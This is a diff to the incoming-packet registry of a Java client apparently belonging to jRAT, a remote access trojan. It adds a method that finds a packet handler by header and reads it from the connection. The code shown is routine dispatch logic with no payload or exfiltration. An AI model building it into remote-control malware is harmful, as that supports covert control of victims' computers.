@@ -1,10 +1,14 @@
 package jrat.client.packets.incoming;
 
+import jrat.client.Connection;
+import jrat.common.Logger;
+
 import java.util.HashMap;
+import java.util.Set;
 
 public class IncomingPackets {
 
-    public static final HashMap<Short, Class<? extends AbstractIncomingPacket>> PACKETS_INCOMING = new HashMap<Short, Class<? extends AbstractIncomingPacket>>();
+    public static final HashMap<Short, Class<? extends IncomingPacket>> PACKETS_INCOMING = new HashMap<>();
 
     static {
         PACKETS_INCOMING.clear();
@@ -93,7 +97,7 @@ public class IncomingPackets {
      * @param packet
      * @throws Exception if the packet header is already registered
      */
-    public static void register(short header, Class<? extends AbstractIncomingPacket> packet) throws Exception {
+    public static void register(short header, Class<? extends IncomingPacket> packet) throws Exception {
         if (PACKETS_INCOMING.containsKey(header)) {
             throw new Exception("header '" + header + "' already exists");
         }
@@ -101,4 +105,24 @@ public class IncomingPackets {
         PACKETS_INCOMING.put(header, packet);
     }
 
+    public static void execute(Connection con, short header) {
+        try {
+            IncomingPacket packet = null;
+            Set<Short> set = PACKETS_INCOMING.keySet();
+            for (short s : set) {
+                if (s == header) {
+                    packet = PACKETS_INCOMING.get(s).newInstance();
+                    break;
+                }
+            }
+
+            if (packet != null) {
+                packet.read(con);
+            } else {
+                Logger.err("failed to find packet '" + header + "'");
+            }
+        } catch (Exception ex) {
+            ex.printStackTrace();
+        }
+    }
 }
